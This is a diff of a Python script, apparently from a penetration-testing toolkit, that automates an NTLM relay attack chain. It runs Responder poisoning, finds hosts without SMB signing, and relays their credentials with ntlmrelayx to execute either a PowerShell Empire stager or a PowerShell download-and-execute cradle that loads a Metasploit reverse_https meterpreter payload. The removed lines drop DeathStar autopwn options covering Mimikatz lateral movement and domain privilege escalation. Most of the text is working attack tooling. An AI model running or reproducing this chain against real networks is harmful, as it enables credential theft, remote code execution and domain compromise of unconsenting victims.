@@ -48,18 +48,8 @@ def main():
     parser_command.add_argument('--msf', help='Start Metasploit listener as relay target',
                         action='store_const', dest='action', const='msf'
     )
-    parser_command.add_argument('--deathstar', help='Start Empire listener as relay target with Deathstar autopwn',
-                        action='store_const', dest='action', const='deathstar'
-    )
     parser_command.add_argument('--command', help='Command to relay to targets',
                         dest='action'
-    )
-    
-    parser.add_argument('--no-mimikatz', help='Deathstar - Do not use Mimikatz during lateral movement (default: False)',
-                        action='store_true', dest='disable_mimikatz'
-    )
-    parser.add_argument('--no-domain-privesc', help='Deathstar - Do not use domain privilege escalation techniques (default: False)',
-                        action='store_true', dest='disable_domain_privesc'
     )
 
     args = parser.parse_args()
@@ -70,35 +60,28 @@ def main():
     msf_srvport = args.port
     msf_lport = '8443'
     action=args.action
-    disable_mimikatz = args.disable_mimikatz
-    disable_domain_privesc = args.disable_domain_privesc
     
     if action=='capture':
         launch_relayx=False
         launch_empire=False
-        launch_deathstar=False
         launch_msf=False
+        window_layout='even-horizontal'
     elif action=='empire':
         launch_relayx=True
         launch_empire=True
-        launch_deathstar=False
         launch_msf=False
-    elif action=='deathstar':
-        launch_relayx=True
-        launch_empire=True
-        launch_deathstar=True
-        launch_msf=False
+        window_layout='tiled'
     elif action=='msf':
         launch_relayx=True
         launch_empire=False
-        launch_deathstar=False
         launch_msf=True
+        window_layout='main-vertical'
     else:
         launch_relayx=True
         launch_empire=False
-        launch_deathstar=False
         launch_msf=False
         relayx_command=action
+        window_layout='even-horizontal'
     
     if not host_ip:
         host_ip = input("\nEnter interface IP address to listen on: ")
@@ -108,6 +91,9 @@ def main():
     empire_user = os.environ['EMPIRE_USER']
     empire_pass = os.environ['EMPIRE_PASS']
     
+    # Run base image docker entrypoint so environment variables are parsed into config files like normal
+    subprocess.Popen("/opt/entrypoint.sh", shell=True).wait()
+    
     # Set up tmux window
     tmux_server = libtmux.Server()
     tmux_session = tmux_server.new_session(session_name="mitm", window_name="mitm", kill_session=True)
@@ -116,33 +102,20 @@ def main():
     
     if launch_relayx:
         print("Getting relay target list")
-        subprocess.Popen("/opt/check-smb-signing.sh --finger --finger-path /usr/share/responder/tools/RunFinger.py --out-dir /tmp -a %s" % (target_ip), shell=True).wait()
+        subprocess.Popen("/opt/check-smb-signing.sh --finger --host-discovery --finger-path /usr/share/responder/tools/RunFinger.py --out-dir /tmp -a %s" % (target_ip), shell=True).wait()
     
     if launch_empire:
-        print("\nLaunching Empire (waiting 10s)...")
-        command = 'cd /opt/Empire && ./empire --rest --username %s --password %s' % (empire_user, empire_pass)
+        print("\nLaunching Empire Server(waiting 10s)...")
+        command = 'powershell-empire server'
         tmux_pane.send_keys(command)
         time.sleep(10)
-        
-        if launch_deathstar:
-            print("\nLaunching DeathStar (waiting 10s)...")
-        else:
-            print("\nLaunching DeathStar to create Empire listener (waiting 10s)...")
-        
-        command = 'cd /opt/DeathStar && python3 ./DeathStar.py -u %s -p %s -lip %s -lp %s' % (empire_user, empire_pass, host_ip, empire_lport)
-        if disable_mimikatz:
-            command += " --no-mimikatz"
-        if disable_domain_privesc:
-            command+= " --no-domain-privesc"
         
         tmux_pane = tmux_pane.split_window()
+        
+        print("\nLaunching Empire Client(waiting 20s)...")
+        command = 'powershell-empire client -r /opt/scripts/listener_http.rc'
         tmux_pane.send_keys(command)
-        time.sleep(10)
-    
-        #Even if we do not use DeathStar, we still use it to spawn the listener; leave the window open in case we want to fire it up again later
-        if not launch_deathstar:
-            print("Killing DeathStar (you can relaunch it later if you want)...")
-            tmux_pane.send_keys('C-c', enter=False, suppress_history=False)
+        time.sleep(20)
         
         print("\nGetting API Token...")
         requests.packages.urllib3.disable_warnings()        #Disable untrusted SSL cert warning
@@ -151,24 +124,24 @@ def main():
         print("Token: " + empire_token)
         
         print("\nGetting powershell stager...")
-        json = requests.post('https://localhost:1337/api/stagers?token=' + empire_token, verify=False, json={"StagerName":"multi/launcher", "Listener":"DeathStar"}).json()
+        json = requests.post('https://localhost:1337/api/stagers?token=' + empire_token, verify=False, json={"StagerName":"multi/launcher", "Listener":"http"}).json()
         empire_stager = json['multi/launcher']['Output']
         print("Stager: " + empire_stager)
         
         relayx_command = empire_stager
         
+        tmux_pane = tmux_pane.split_window()
+        
     if launch_msf:
         command = 'msfconsole -q -x "use exploit/multi/script/web_delivery; set target 2; set uripath /; set ssl true; set srvport %s; set payload windows/meterpreter/reverse_https; set exitonsession false; set lhost %s; set lport %s; set enablestageencoding true; set autorunscript migrate -f; exploit -j -z"' % (msf_srvport, host_ip, msf_lport)
-        
-        tmux_pane = tmux_pane.split_window()
         tmux_pane.send_keys(command)
-        time.sleep(10)
         
         relayx_command = 'powershell -nop -exec bypass -c "IEX((New-Object Net.WebClient).DownloadString(\'https://raw.githubusercontent.com/jaredhaight/Invoke-MetasploitPayload/master/Invoke-MetasploitPayload.ps1\'); Invoke-MetasploitPayload \'https://%s:%s/\'"' % (host_ip, msf_srvport)
         
+        tmux_pane = tmux_pane.split_window()
         
     if launch_relayx:
-        for line in fileinput.input("/opt/Responder/Responder.conf", inplace=True):
+        for line in fileinput.input("/usr/share/responder/Responder.conf", inplace=True):
             line=line.replace("SMB = On","SMB = Off")
             line=line.replace("HTTP = On","HTTP = Off")
             line=line.replace("HTTPS = On","HTTPS = Off")
@@ -176,20 +149,27 @@ def main():
         fileinput.close()
         
         if os.path.exists("/tmp/hosts-signing-false"):
-            command = "ntlmrelayx.py -smb2support -socks -tf %s -c '%s'" % ("/tmp/hosts-signing-false.txt", relayx_command)
+            command = "impacket-ntlmrelayx -smb2support -socks -tf %s -c '%s'" % ("/tmp/hosts-signing-false.txt", relayx_command)
         else:
-            command = "ntlmrelayx.py -smb2support -c '%s'" % (relayx_command)
+            command = "impacket-ntlmrelayx -smb2support -c '%s'" % (relayx_command)
             
-        #tmux_window.split_window(shell=command)
-        tmux_pane = tmux_pane.split_window()
+        
         tmux_pane.send_keys(command)
+        
+        tmux_pane = tmux_pane.split_window()
     
-    command = "cd /opt/Responder && python3 Responder.py -I eth0 -d -w -e " + host_ip
-    #tmux_window.split_window(shell=command)
-    tmux_pane = tmux_pane.split_window()
+    # Temporarily disable to be quieter
+    
+    # for line in fileinput.input("/usr/share/responder/Responder.conf", inplace=True):
+    #     line=line.replace("Challenge = Random","Challenge = 1122334455667788")
+    #     print(line)
+    # fileinput.close()
+    
+    command = "responder -I eth0 -d -w -e " + host_ip
+    
     tmux_pane.send_keys(command)
     
-    tmux_window.select_layout("main-vertical")
+    tmux_window.select_layout(window_layout)
     tmux_server.attach_session(target_session="mitm")
     
     
